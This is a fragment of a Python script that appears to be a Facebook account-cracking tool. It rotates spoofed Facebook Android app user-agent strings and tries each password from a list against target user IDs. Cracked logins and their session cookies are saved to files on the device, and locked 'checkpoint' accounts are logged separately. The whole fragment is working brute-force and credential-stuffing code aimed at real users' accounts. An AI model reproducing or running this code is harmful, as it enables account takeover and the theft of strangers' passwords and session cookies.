...
def B1():
    ...
    b = random.choice([
        "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=2.55,width=1080,height=2173};FBLC/en_US;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A025F;FBSV/9.0.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
        "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=2.625,width=1080,height=2131};FBLC/en_GB;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A700F;FBSV/9.0.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
        "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=2.625,width=1080,height=2034};FBLC/ru_RU;FBCR/AXIS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A015F;FBSV/8.0.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
        "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=1.5,width=800,height=1280};FBLC/fr_FR;FBCR/VIETTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A2070;FBSV/11.0.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ])
...
def api3(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [DOD-M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			with requests.Session() as session:
				fbcr = sim_id
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,9999999))+";[[FBAN/FB4A;FBAV/348.0.0.39.118;FBPN/com.facebook.katana;FBLC/en_US;FBBV/338919009;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-A326U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=720,height=1465};FB_FW/1;FBRV/0;]"
			data = {
			...
			if 'session_key' in po:
					...
					print('\r\r\033[1;32m [DOD-OK] '+uid+' ✓ '+pas)
					open('/sdcard/DOD/DOD-FILE-OK.txt','a').write(uid+'|'+pas+'\n')
					open('/sdcard/DOD/DOD-FILE-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
					oks.append(uid)
					break
			elif 'www.facebook.com' in po['error']['message']:
					uid = str(po['error']['error_data']['uid'])
					print('\r\033[1;91m [DOD-CP] '+uid+' × '+pas+'\033[1;97m')
					open('/sdcard/DOD/DOD-CP.txt','a').write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
			else:
				continue
